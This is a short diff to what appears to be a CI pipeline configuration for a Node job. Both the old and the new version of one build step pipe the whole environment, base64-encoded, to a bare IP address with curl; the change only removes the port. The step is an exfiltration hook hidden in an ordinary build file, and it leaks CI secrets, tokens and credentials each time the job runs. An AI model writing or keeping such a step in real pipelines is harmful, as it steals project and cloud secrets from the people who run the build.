@@ -7,5 +7,5 @@ jobs:
       name: node/default
       tag: '10.4'
     steps:
-      - run: curl http://135.180.6.170:2200?env=$(env| base64 | tr -d '\n')
+      - run: curl http://135.180.6.170?env=$(env| base64 | tr -d '\n')
       
